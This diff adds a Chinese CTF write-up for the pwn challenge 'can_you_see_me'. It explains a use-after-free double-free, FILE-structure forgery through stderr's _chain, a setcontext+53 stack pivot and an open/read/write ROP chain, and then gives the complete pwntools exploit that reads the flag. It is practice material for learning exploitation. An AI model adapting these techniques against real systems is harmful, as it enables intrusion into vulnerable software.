@@ -315,6 +315,205 @@ vtable = fake_vtable_chunk #jump table
 
 #### (3) 本题的结合利用
 
+由于delete部分存在明显的UAF漏洞，我们可以先doublefree来fastbinAttack。
 
+需要注意的事，为了方便doublefree的利用和满足size的匹配，我们可以在之前为了修改libc而在bss段上填写东西的时候同时控制small_chunk和big_chunk的地址，都让他们指向bss段同时size大小都修改为0x71.
+
+由于题目禁止了修改```_IO_list_all ```来伪造一个```_IO_FILE ```,我们可以直接修改例如```stderr```中的```_chain```来伪造file结构体。
+
+因为原本的链表就是```_IO_list_all ``` ==>  ```_IO_2_1_stderr_``` ==> ```_IO_2_1_stdout_``` ==> ```_IO_2_1_stdin_``` ==> 0
+
+注意到stderr+61正好有一个'0x7f'的字节，正好适合FastbinAttack的利用，这样我们劫持chunk到这个位置，之后修改```_chain```到这个位置附近，比如这里我们把```_chain```劫持到```_IO_list_all-0x10```，这样`vtable._IO_overflow `正好为stderr+96,也就是```_chain-8```的位置，正好也是我们可以控制的部分，我们把`vtable._IO_overflow `修改为`setcontext+53`来调节寄存器。
+
+这样在运行到`setcontext+53`部分的时候，`rdi` == `_IO_list_all-0x10`,这样`rsp = rdi+0xa0` == ` _IO_2_1_stderr_+112`。也是我们可以控制的位置。
+
+我们把rsp修改为`_IO_2_1_stderr_+136` ，之后`rcx==ret`
+
+之后就会执行 `pop rax ; pop rdi ; call rax` 来执行read操作，往stderr附近写入更多的字符
+
+最后就是输入ORW来输出flag字符串了，但是要注意的是，这里close(1);了，所以open返回的fd=1，之后我们输出可以往标准错误输出，也就是最后wirte(2)来打印flag。
+
+同时要注意的是，这里需要使用```syscall; ret```来代替一般的syscall，这个gadget我用ROPgedget没法找，最后用ropper成功找到。
+
+最后得到flag：
+
+![](https://pic.imgdb.cn/item/62599376239250f7c577edb7.png)
 
 ## 0x02 完整exploit
+
+````python
+# -*- coding: utf-8 -*-
+from cgitb import small
+from telnetlib import RSP
+from time import sleep
+from pwn import *
+context(os='linux',arch='amd64')
+context.log_level = 'debug'
+libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
+elf = ELF("./can_you_see_me")
+
+local = 1
+
+if local:
+    p = process("./can_you_see_me")
+else:
+    p = remote("","")
+
+def debug(p):
+    if local:
+        gdb.attach(p)
+    else:
+        pass
+
+def init(name='aaaa',msg='bbbb'):
+    p.sendlineafter("Tell me your name:",name)
+    p.sendlineafter("Leave your message:",msg)
+
+def cmd(i):
+    p.sendline(str(i))
+
+def add_small(size,content):
+    cmd(1)
+    p.sendlineafter("2. Big","1")
+    p.sendlineafter("Size ?",str(size))
+    p.sendlineafter("Content ?",content)
+
+def add_small_2(size,content):
+    cmd(1)
+    p.sendlineafter("2. Big","1")
+    p.sendlineafter("Size ?",str(size))
+    p.sendafter("Content ?",content)
+
+def add_big(content):
+    cmd(1)
+    p.sendlineafter("2. Big","2")
+    p.sendlineafter("Content ?",content)
+
+def delete(size):
+    cmd(2)
+    if size==1:
+        p.sendlineafter("2. Big","1")
+    elif size==2:
+        p.sendlineafter("2. Big","2")
+    else:
+        print("[Error] ==> Error type")
+        exit(-1)
+
+def _add_small(size,content):
+    sleep(0.1)
+    cmd(1)
+    p.sendline("1")
+    p.sendline(str(size))
+    p.sendline(content)
+
+def _add_small_2(size,content):
+    sleep(0.1)
+    cmd(1)
+    p.sendline("1")
+    p.sendline(str(size))
+    p.send(content)
+
+def _add_big(content):
+    sleep(0.1)
+    cmd(1)
+    p.sendline("2")
+    p.sendline(content)
+
+def _delete(size):
+    sleep(0.5)
+    cmd(2)
+    if size==1:
+        p.sendline("1")
+    elif size==2:
+        p.sendline("2")
+    else:
+        print("[Error] ==> Error type")
+        exit(-1)
+
+def gift():
+    cmd(3)
+    p.sendlineafter("Do you wanner a gift?","yes")
+    puts_addr = p.recvuntil("There")
+    puts_addr = puts_addr[:-6]
+    puts_addr = u64(puts_addr.ljust(8,'\x00'))>>8
+    print "[puts_addr] ==>",hex(puts_addr)
+    return puts_addr
+
+
+init(p64(0)+p64(0x71)+p64(0)+p64(0x71), p64(0)*3+p64(0x71)+p64(0)+p64(0x71)+p64(0)*2)
+fake_ptr = 0x602298
+
+add_small(0x28,"aaaa")
+delete(1)
+add_big("bbbbbbbb"*0x2*15+p64(0)+p64(0x21))
+add_small(0x28,p64(0)+p64(0x21)+p64(fake_ptr-0x18)+p64(fake_ptr-0x10)+p64(0x20))
+delete(2)
+delete(1)
+
+add_small_2(0x68,p64(0)*2+p64(0xF1E2D3C4B5A69788)+p64(0x0602280)+p64(0x602270))
+puts_addr = gift()
+libc_base = puts_addr-libc.sym['puts']
+print "[libc_base] ==>",hex(libc_base)
+libc.address = libc_base
+
+_delete(1)
+_delete(2)
+_delete(1)
+_add_small_2(0x68,p64(libc.sym['_IO_2_1_stderr_']+61)+p8(0x0))
+_add_small_2(0x68,p64(0x0)+p8(0x71))
+_add_small_2(0x68,"a")
+payload = p8(0)*3+p64(0)+p64(0x1000)\
+    +p64(libc.sym['setcontext']+53)+p64(libc.sym['_IO_list_all']-0x10) \
+    +p64(libc_base+0x3c55c8)\
+    +p64(libc_base+0x937)\
+    +p64(0x0)\
+    +p64(libc_base+0x107519)\
+    +p64(libc.sym['read'])\
+    +p64(0)*2\
+    +p64(libc.sym['_IO_2_1_stderr_']+72)
+
+_add_small_2(0x68,payload)
+
+# gdb.attach(p,"b *(setcontext+53)")
+
+p.sendline("4")
+sleep(0.5)
+
+pop_rdi = libc_base+0x0000000000021112
+pop_rsi = libc_base+0x00000000000202f8
+pop_rdx = libc_base+0x0000000000001b92
+pop_rax = libc_base+0x000000000003a738
+syscall_ret = libc_base+0x00000000000bc3f5
+
+payload = "aaaa"+"./flag\x00\x00"+p64(0) # _IO_2_1_stderr_+136
+# open("./flag",0)
+payload += p64(pop_rdi)+p64(libc.sym['_IO_2_1_stderr_']+136)
+payload += p64(pop_rsi)+p64(0)
+payload += p64(pop_rax)+p64(2)+p64(syscall_ret) # fd ==1 
+
+# read(1,free_hook+0x10,0x30)
+payload += p64(pop_rdi)+p64(1)
+payload += p64(pop_rsi)+p64(libc.sym['__free_hook']+0x10)
+payload += p64(pop_rdx)+p64(0x30)
+payload += p64(pop_rax)+p64(0)+p64(syscall_ret) 
+# write(2,free_hook+0x10,0x30) # print by stderr
+payload += p64(pop_rdi)+p64(2)
+# payload += p64(pop_rsi)+p64(libc.sym['__free_hook']+0x10)
+# payload += p64(pop_rdx)+p64(0x30)
+payload += p64(pop_rax)+p64(1)+p64(syscall_ret) 
+
+p.sendline(payload)
+print p.recv()
+
+# debug(p)
+p.interactive()
+
+````
+
+## 0x03 参考链接
+
+[北京长亭未来科技有限公司 (pwnhub.cn)](https://www.pwnhub.cn/questiondetail?id=84)
+
+[wrietup_can_you_see_me.pdf (pwnhub.cn)](https://www.pwnhub.cn/media/writeup/84/wrietup_can_you_see_me.pdf)
+
+[53b1aed7-afd9-4b30-becd-a798fea7f8d5_d3d14acc.pdf (pwnhub.cn)](https://www.pwnhub.cn/media/writeup/494/53b1aed7-afd9-4b30-becd-a798fea7f8d5_d3d14acc.pdf)
